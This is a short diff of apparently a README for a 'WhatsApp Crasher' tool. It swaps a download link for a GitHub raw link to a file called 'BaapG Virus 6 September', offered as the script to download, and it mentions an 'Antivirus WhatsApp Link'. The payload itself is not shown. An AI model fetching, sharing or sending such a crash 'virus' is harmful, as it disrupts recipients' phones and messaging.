@@ -8,7 +8,7 @@
 
 1.Step:
 Download Script Link 👇
-       https://rb.gy/vhjnqu
+       https://github.com/Vretlee/WhatsApp-Crasher/raw/main/BaapG%20Virus%206%20September.txt
 
 2.Step:
 Antivirus WhatsApp Link 👇
